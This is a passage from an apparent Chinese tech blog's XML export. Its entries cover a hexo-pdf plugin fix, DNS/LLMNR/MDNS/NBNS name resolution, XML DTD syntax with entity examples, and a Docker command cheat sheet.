class="subst">$&#123;text&#125;</span>&lt;/figcaption&gt;&lt;/figure&gt;`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>bug修复</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>hexo-renderer-marked</tag>
        <tag>图床</tag>
        <tag>防盗链</tag>
      </tags>
  </entry>
  <entry>
    <title>解决hexo-pdf无法使用的问题</title>
    <url>/archives/e9ccef3c.html</url>
    <content><![CDATA[<p>下载<code>hexo-pdf</code>后，修改<code>index.js</code>中的代码将<code>tag</code>名修改为非<code>pdf</code>即可<br>我这里修改为<code>pdfpath</code><br>之前修改为<code>pdf-path</code>也不能正常运行，pdf应该时不能单独出现的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* hexo-pdf</span></span><br><span class="line"><span class="comment">* https://github.com/superalsrk/hexo-pdf.git</span></span><br><span class="line"><span class="comment">* Copyright (c) 2015, superalsrk</span></span><br><span class="line"><span class="comment">* Licensed under the MIT license.</span></span><br><span class="line"><span class="comment">* Syntax:</span></span><br><span class="line"><span class="comment">* &#123;% pdf http://yourdoman.com/x.pdf %&#125; %&#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>),</span><br><span class="line">    path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>),</span><br><span class="line">    fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">tag</span>.<span class="title function_">register</span>(<span class="string">&#x27;pdfpath&#x27;</span>, <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> htmlTmlSrc = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;reader.ejs&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> htmlTml = ejs.<span class="title function_">compile</span>(fs.<span class="title function_">readFileSync</span>(htmlTmlSrc, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> type = <span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> pdfLink = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pdfLink.<span class="title function_">indexOf</span>(<span class="string">&#x27;.pdf&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  	type = <span class="string">&#x27;normal&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(pdfLink.<span class="title function_">indexOf</span>(<span class="string">&#x27;drive.google.com&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  	type = <span class="string">&#x27;googledoc&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(pdfLink.<span class="title function_">indexOf</span>(<span class="string">&#x27;www.slideshare.net&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  	type = <span class="string">&#x27;slideshare&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">htmlTml</span>(&#123;<span class="string">&quot;src&quot;</span>: args[<span class="number">0</span>], <span class="string">&quot;type&quot;</span> : type&#125;);</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>bug修复</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>hexo-pdf</tag>
      </tags>
  </entry>
  <entry>
    <title>LDAP-轻量级目录访问协议</title>
    <url>/archives/abb3a32f.html</url>
    <content><![CDATA[<!--<embed src="./LDAP-轻量级目录访问协议.pdf" width="100%" height="750", type="application/pdf">-->



	<div class="row">
    <embed src="LDAP-轻量级目录访问协议.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>安全技术</category>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>ldap</tag>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS-LLMNR-MDNS-NBNS原理</title>
    <url>/archives/9c52be10.html</url>
    <content><![CDATA[<h1 id="DNS-LLMNR-MDNS-NBNS原理"><a href="#DNS-LLMNR-MDNS-NBNS原理" class="headerlink" title="DNS\LLMNR\MDNS\NBNS原理"></a>DNS\LLMNR\MDNS\NBNS原理</h1><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p><a href="https://zhuanlan.zhihu.com/p/79350395">面试官:讲讲DNS的原理？</a></p>
<p>域名解析过程</p>
<p>浏览器先在自己的缓存中查找有没有域名的解析，如果没有则到主机的hosts文件中找，如果也没有就到本地dns缓存中去找，如果也没有就到本地dns服务器去找，如果该域名不在本地dns服务器解析的范围内，但缓存中已经包好了该解析则返回ip，此解析具有权威性，如果设置了转发模式，则将该消息转发到上一级解析服务器，如果仍不能解析或找根或者上上级，如果没有配置解析则转发到13台根服务器，根服务器再告诉服务器顶级域服务器的地址，顶级于服务器返回二级域服务器的地址，这样一直递归查询，直到找到为止。</p>
<p>dns使用的协议</p>
<p>dns解析时使用udp协议</p>
<p>解析数据数据量较小，一般不超过512字节，解析速度快，对稳定性要求不高</p>
<p>区域传送时使用tcp协议</p>
<p>区域间复制信息传输数据量大，对稳定性的要求高。</p>
<p>DNS的规范规定了2种类型的DNS服务器，一个叫主DNS服务器，一个叫辅助DNS服务器。在一个区中主DNS服务器从自己本机的数据文件中读取该区的DNS数据信息，而辅助DNS服务器则从区的主DNS服务器中读取该区的DNS数据信息。当一个辅助DNS服务器启动时，它需要与主DNS服务器通信，并加载数据信息，这就叫做区传送（zone transfer）。 这种情况下，使用TCP协议。</p>
<p>查看域名解析过程命令</p>
<p>dig <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p>dig +trace <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p>资源记录RR类型</p>
<p>A</p>
<p>AAAA<br>PTR &#x2F;&#x2F;反向域名解析</p>
<p>NS &#x2F;&#x2F;域名服务器</p>
<p>cname <a href="//canonical">&#x2F;&#x2F;canonical</a> name 规范名</p>
<p>max 邮件交换</p>
<p>soa 起始授权机构</p>
<p>域名解析服务器又分为权威域名服务器与递归解析服务器。</p>
<p>FQDN-完全合格域名</p>
<p>从客户端到本地dns服务器是迭代查询，dns服务器之间的交互查询是递归查询f</p>
<p>CDN-内容分发网络</p>
<p>将内容缓存再终端用户附近</p>
<p>当用户访问网站时，利用全局负载技术，将用户的访问指向距离最近的缓存服务器上，由缓存服务器响应用户请求。</p>
<h1 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h1><p>link-local multicast name resolution 本地链接多路名称解析</p>
<p>当DNS服务不可用时，本地主机就会使用LLMNR协议来进行名称解析，通过UDP协议向224.0.0.252:5355组播地址发送广播，来解析本网段上得名称，使用的数据包格式与传统DNS数据包一致，其不仅能解析ipv4的地址同样也能解析ipv6的协议，。与LLMNR相似的另一种协议是MDNS，其多播地址为224.0.0.251:5353。</p>
<h2 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h2><p>主机在自己的内部名称缓存中查询名称。如果在缓存中没有找到了名称，那么主机就会向自己配置的主DNS服务器发送查询请求。如果主机没有收到回应或收到了错误信息，主机还会尝试搜索配置的备用DNS服务器。如果主机没有配置DNS服务器，或者如果在连接DNS服务器的时候没有遇到错误但失败了，那么名称解析会失败，并转为使用LLMNR。</p>
<p>主机通过用户数据报协议(UDP)发送多播查询，查询主机名对应的IP地址，这个查询会被限制在本地子网(也就是所谓的链路局部)内。</p>
<p>链路局部范围内每台支持LLMNR，并且被配置为响应传入查询的主机在收到这个查询请求后，会将被查询的名称和自己的主机名进行比较。如果没有找到匹配的主机名，那么计算机就会丢弃这个查询。如果找到了匹配的主机名，这台计算机会传输一条包含了自己IP地址的单播信息给请求该查询的主机。</p>
<h1 id="NBNS"><a href="#NBNS" class="headerlink" title="NBNS"></a>NBNS</h1><p>netbios-名称解析</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>协议规范</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>LLMNR</tag>
        <tag>MDNS</tag>
        <tag>NBNS</tag>
      </tags>
  </entry>
  <entry>
    <title>DTD-文档类型定义</title>
    <url>/archives/67b9bed.html</url>
    <content><![CDATA[<h1 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD-文档类型定义"></a>DTD-文档类型定义</h1><p>用来定义合法的xml文档构建模块，使用一些列合法的元素来定义文档结构，可被用来检测xml文档语法是否正确。DTD可以被成行地声明于xml文档中，也可以成为一个外部引用。</p>
<h2 id="内部文档声明"><a href="#内部文档声明" class="headerlink" title="内部文档声明"></a>内部文档声明</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line">e.g.</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">to</span>&gt;</span>armandhe<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">from</span>&gt;</span>hjx<span class="tag">&lt;<span class="name">from</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">heading</span>&gt;</span>message<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span>hello,world<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="test.xml">test.xml</a></p>
<h2 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h2><p><strong>xml文档部分</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;note.dtd&#x27;</span>&gt;</span> //定义外部文档声明</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">to</span>&gt;</span>armandhe<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">from</span>&gt;</span>hjx<span class="tag">&lt;<span class="name">from</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">heading</span>&gt;</span>message<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span>hello,world<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>dtd文档部分</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="XML文档构建模块"><a href="#XML文档构建模块" class="headerlink" title="XML文档构建模块"></a>XML文档构建模块</h2><p>所有地xml文档均由一下地构建模块构成：</p>
<ul>
<li>元素</li>
<li>属性</li>
<li>实体</li>
<li>PCDATA</li>
<li>CDDATA</li>
</ul>
<h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p>元素是 XML 以及 HTML 文档的<em><strong>主要构建模块</strong></em>。</p>
<p>HTML 元素的例子是 “body” 和 “table”。XML 元素的例子是 “note” 和 “message” 。元素可包含文本、其他元素或者是空的。空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">	父元素文本</span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span>&gt;</span>子元素文本内容<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>    //body与form均为元素</span><br></pre></td></tr></table></figure>

<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>属性可提供有关元素的额外信息。性总是被置于某元素的开始标签中。属性总是以名称&#x2F;值的形式成对出现的。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;computer.gif&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">类似于html实体，html实体在xml中也可以使用，已经被预定义了</span><br></pre></td></tr></table></figure>

<h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是被解析的字符数据（parsed character data）。</p>
<p>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p>
<p><strong>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</strong></p>
<p>文本中的标签会被当作标记来处理，而实体会被展开。</p>
<p>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p>
<p><code>也就是说，某一个元素被定义为PCDATA，那么他内部地文本元素中地内容如果出现其他标记，那么这些标记将被解析为元素,如果要让xml中使用地特殊字符被原样显示，则需要使用对应地实体。</code> </p>
<h3 id="CDDATA"><a href="#CDDATA" class="headerlink" title="CDDATA"></a>CDDATA</h3><p>CDATA 的意思是字符数据（character data）。</p>
<p>***CDATA 是不会被解析器解析的文本。***在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p>
<p><code>通俗得讲就是原样输出</code> </p>
<h2 id="元素声明"><a href="#元素声明" class="headerlink" title="元素声明"></a>元素声明</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> <span class="keyword">EMPTY</span>&gt;</span> //<span class="tag">&lt;<span class="name">note</span> /&gt;</span> 空元素</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">#PCDATA</span>)&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> <span class="keyword">ANY</span>&gt;</span>  //可包含任意内容</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  //字元素必须按章列出顺序出现在元素中且，字元素也需被声明</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">footer</span>)&gt;</span> //声明只出现一次的元素</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">footer</span>+)&gt;</span> //子元素至少出现一次</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">footer</span>*)&gt;</span> //字元素出现一次或多次</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">footer</span>?)&gt;</span> //字元素出现零次或多次</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">head</span>,<span class="keyword">body</span>,(<span class="keyword">message</span>|<span class="keyword">confirm</span>))&gt;</span> //括号总的元素有且只能出现一个</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">#PCDATA</span>|<span class="keyword">to</span>|<span class="keyword">form</span>)*&gt;</span> //可以出现零次或多次的.....</span><br></pre></td></tr></table></figure>

<h2 id="属性声明"><a href="#属性声明" class="headerlink" title="属性声明"></a>属性声明</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ARRLIST 元素名称 属性名称 属性类型 默认值&gt;</span></span><br><span class="line">e.g</span><br><span class="line"><span class="meta">&lt;!AttlIST <span class="keyword">note</span> <span class="keyword">id</span> <span class="keyword">CDATA</span> 1&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="%E5%B1%9E%E6%80%A7%E7%B1%BB%E5%9E%8B%20aafed6de37df4ebd919995b3af4d41d4.csv">属性类型</a></p>
<p><a href="%E5%B1%9E%E6%80%A7%E9%BB%98%E8%AE%A4%E5%80%BC%2028f7fb5827924cfc84ea39b0a288be63.csv">属性默认值</a></p>
<h2 id="实体-1"><a href="#实体-1" class="headerlink" title="实体"></a>实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
<p>实体引用是对实体的引用。</p>
<p>实体可在内部或外部进行声明。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//内部实体</span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 “实体值”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">message</span> <span class="string">&quot;this is a part of a good book&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">des</span>&gt;</span><span class="symbol">&amp;message;</span><span class="tag">&lt;/<span class="name">des</span>&gt;</span> </span><br><span class="line">//外部实体</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">message</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.armandhe.com/a.dtd&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">des</span>&gt;</span><span class="symbol">&amp;message;</span><span class="tag">&lt;/<span class="name">des</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安全技术</category>
        <category>协议规范</category>
      </categories>
      <tags>
        <tag>DTD</tag>
        <tag>XML</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/archives/f5f9fa9b.html</url>
    <content><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>docker 配置文件地址：&#x2F;etc&#x2F;docker    daemon.json 其中定义镜像仓库等关键信息</p>
<p>docker info &#x2F;&#x2F;查看docker信息</p>
<p>docker version &#x2F;&#x2F;查看docker 版本</p>
<p>docker run 镜像 &#x2F;&#x2F;运行镜像</p>
<p>—name &#x2F;&#x2F;为容器命名</p>
<p>-i &#x2F;&#x2F;交互式运行</p>
<p>-t &#x2F;&#x2F;打开一个终端</p>
<p>-d &#x2F;&#x2F;后台运行</p>
<p>-rm &#x2F;&#x2F;推出后销毁容器</p>
<p>-p ip:真机端口：容器端口 | 只写容器端口| 不写-p ,直接写端口</p>
<p>docker stats &#x2F;&#x2F;查看docker状态</p>
<p>docker image ls &#x2F;&#x2F;列出本地所有镜像</p>
<p>docker image pull &#x2F;&#x2F;拉取一个hub镜像</p>
<p>docker image inspect &#x2F;&#x2F;查看镜像的具体信息</p>
<p>docker image push &#x2F;&#x2F;推送镜像</p>
<p>docker image load &#x2F;&#x2F;从包中加载一个镜像</p>
<p>docker image  save &#x2F;&#x2F;打包一个镜像</p>
<p>docker image search httpd &#x2F;&#x2F;搜索镜像</p>
<p>docker image  rmi 镜像名 &#x2F;&#x2F;删除一个镜像</p>
<p>docker ps -a &#x2F;&#x2F;查看正在运行的以及曾今运行过的容器</p>
<p>-n&#x3D;1 &#x2F;&#x2F;显示最近运行的容器，数字表示个数</p>
<p>-q   &#x2F;&#x2F;只显示容器的编号</p>
<p>exit &#x2F;&#x2F;停止并退出容器</p>
<p>^+P+Q &#x2F;&#x2F;容器不停止退出</p>
<p>docker rm -f $(docker  ps -qa) &#x2F;&#x2F;删除所有容器</p>
<p>docker rm  容器id &#x2F;&#x2F;删除一个容器</p>
<p>docker inspect  容器id &#x2F;&#x2F;查容器信息</p>
<p>docker stop 容器id</p>
<p>docker restart 容器id</p>
<p>docker stop 容器id</p>
<p>docker kill  容器id</p>
<p>docker run </p>
<p>-d(后台运行，脱离真机终端) </p>
<p>-p 80:80 (真机端口：容器端口)  使外部可以访问</p>
<p>-i (交互式运行) </p>
<p>-t (终端) </p>
<p>—rm(当容器处于退出状态时自动删除容器)</p>
<p>—name 为容器指定名称</p>
<p>docker exec  -it 容器 id &#x2F;bin&#x2F;bash  &#x2F;&#x2F;登录容器</p>
<p>-c  “count&#x3D;0;while true;do echo “111”;sleep 2;let count++if [ $count -gt 100;then return;fi];done” &#x2F;&#x2F;输入命令</p>
<p>一个容器中只有一个主进程，并一直占据容器的终端</p>
<p>docker kill|stop  容器id &#x2F;&#x2F;停止容器</p>
<p>docker rm -f 容器id &#x2F;&#x2F;删除容器</p>
<p>docker top 容器id &#x2F;&#x2F;显示资源占用信息</p>
<p>docker exec -it 容器id shell &#x2F;&#x2F;进入正在运行的容器，并开启一个新的终端，退出后不会杀死容器</p>
<p>docker attch b2851800b493  &#x2F;&#x2F;进入容器，不开启一个新的终端，推出后会杀死容器</p>
<p> docker cp 容器id:容器内路径 目的主机路径 &#x2F;&#x2F;从容器内向主机拷贝数据</p>
<p>docker pause 容器id &#x2F;&#x2F;暂停容器</p>
<p>docker unpause 容器id &#x2F;&#x2F;停止暂停</p>
<p>自定义镜像</p>
<p>method 1:</p>
<p>Dockerfile</p>
<p>method 2 :</p>
<p>打包现有文件</p>
<p>docker commit -m&#x3D;”描述信息” -a&#x3D;”作者” 容器ID 目标镜像名:tag</p>
<p>镜像是一种轻量级的、可执行的独立软件包，用来打包软件和软件的运行环境等，他包含了软件运行所需要的所有的代码、库、环境变量、配置文件等</p>
<h1 id="docker镜像加载原理"><a href="#docker镜像加载原理" class="headerlink" title="docker镜像加载原理"></a>docker镜像加载原理</h1><h2 id="联合文件系统-UFS"><a href="#联合文件系统-UFS" class="headerlink" title="联合文件系统-UFS"></a>联合文件系统-UFS</h2><p>将文件分层管理，与图层有异曲同工之妙，可将文件的修改一层一层的叠加，可共享一些层，从而节约的内存与空间，比如安装mysql与php都需要用到centos，则centos只会被下载一次，不需要重复下载</p>
<p>我们可以运行一个docker容器，然后在该容器中修改自己需要的单元，修改后的内容可以通过docker commit 来保存一个新的镜像，我们修改的部分成为新的一层。</p>
<p>docker commit -a author -m describtion_info  容器id 镜像名:标签 -p 在执行改命令时暂停容器 -c 使用dockerfile创建容器</p>
<h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><p>容器被删除后，其中保存的数据就消失了，这样风险太高，这是后需要将数据保存在别的地方，我们通过卷技术来实现，</p>
<p>原理就是将容器内的数据关联到真机上面。不仅如此，容器间也可以实现数据共享</p>
<p>方式一：</p>
<p>docker  run -it -v 主机目录地址: 容器目录地址 -v 主机目录地址: 容器目录地址</p>
<p>可同时挂载多个目录</p>
<p>双向绑定，修改任一方的文件，另一方将同时变化，文件数据实际存储在真机上，删除容器后，数据不会丢失</p>
<p> 具名挂载：指定挂载卷的名称</p>
<p>匿名挂载：不指定挂载卷的名称  </p>
<p>默认挂载路径：&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;卷名&#x2F;_data&#x2F;</p>
<p>docker volume ls   &#x2F;&#x2F;查看所有卷</p>
<p>-v 卷名:容器内路径:ro|rw &#x2F;&#x2F;只读，可读可写          针对容器而言</p>
<p>方式二：dickerfile</p>
<p>新建一个文件，写入一下内容</p>
<p>FROM centos &#x2F;&#x2F;基础镜像</p>
<p>VOLUME [“容器内目录地址01”,”容器内目录地址02”]</p>
<p>CMD echo “ ——挂载完毕———“</p>
<p>CMD   &#x2F;bin&#x2F;bash</p>
<p>执行：docker build -f  dockerfile_name -t armandhe&#x2F;centos(镜像名) .</p>
<h2 id="数据卷容器-容器与容器将数据同步"><a href="#数据卷容器-容器与容器将数据同步" class="headerlink" title="数据卷容器-容器与容器将数据同步"></a>数据卷容器-容器与容器将数据同步</h2><p>创建三个容器———实现了同一功能的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it  —name <span class="string">&quot;docker01&quot;</span> 容器<span class="built_in">id</span>  //创建父容器</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it —name <span class="string">&quot;docker02&quot;</span> 容器<span class="built_in">id</span> —volumes-from docker01 //创建子容器</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it —name <span class="string">&quot;docker03&quot;</span> 容器<span class="built_in">id</span> —volumes-from docker01 //创建子容器</span><br></pre></td></tr></table></figure>

<p>三个容器共享数据，无论在哪一个容器中新增数据，另外两个都会同步。同步的数据只是针对数据卷的。</p>
<h1 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h1><p>dockfile 一行命令就是一层，定义了所有的步骤</p>
<p>dockerinages :通过dockerfile生成的镜像</p>
<p>docker容器：容器就是运行起来的镜像，镜像与容器的关系就像类与实例的关系</p>
<p>所有指令均为大写</p>
<h2 id="dockerfile指令"><a href="#dockerfile指令" class="headerlink" title="dockerfile指令"></a>dockerfile指令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM  //基础镜像</span><br><span class="line">MAINRAINER //维护者信息</span><br><span class="line">RUN //运行时的命令</span><br><span class="line">ADD //步骤，添加内容</span><br><span class="line">WORKDIR //镜像的工作目录</span><br><span class="line">VOLUME //容器卷</span><br><span class="line">EXPOSE //指定暴露的端口</span><br><span class="line">RUN //</span><br><span class="line">CMD //指定容器启动的时候需要运行的命令,只有最后一个会生效，可被替代</span><br><span class="line">ENTRYPOINT //和cmd相似，但可追加命令</span><br><span class="line">ONBULID //当构建一个被继承dockerfile 这个时候就会运行改命令</span><br><span class="line">COPY //类似add，将文件拷贝到镜像中</span><br><span class="line">ENV //构建的时候设置环境变量</span><br></pre></td></tr></table></figure>

<p>发布镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker login -u dockerhub_name -p</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag reposity_name/images_name:tag</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push tag</span><br></pre></td></tr></table></figure>

<h1 id="docker网络原理"><a href="#docker网络原理" class="headerlink" title="docker网络原理"></a>docker网络原理</h1><p>docker安装的时候会生成张docker0网卡，充当所有容器的路由器</p>
<p>evth-pair &#x2F;&#x2F;充当桥梁来连接不同的虚拟设备</p>
<p>生成一个容器的时候会成对得生成evth-pair网卡，使得容器与容器之间可以相互通信</p>
<p><img src="/archives/f5f9fa9b/Untitled.png"></p>
<p>所有的容器在不指定网络的情况下，都是由docker0进行路由的，docker会为每一个容器分配一个可用的ip</p>
<p><img src="/Untitled%201.png"></p>
<p>物理机网卡与docker通过NAT直连</p>
<h2 id="—link"><a href="#—link" class="headerlink" title="—link"></a>—link</h2><p>容器重启之后，ip地址可能发生变化，那么容器之间通过ip进行通信的话，就需要重新进行配置，这不是我们需要的效果。所以通过—link将两个容器连接起来，无论ip怎么变化，只要容器的名称-服务名不变，那么两个容器之间就仍然可以正常通信。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P —name <span class="string">&quot;tomcat01&quot;</span> tomcat</span><br></pre></td></tr></table></figure>

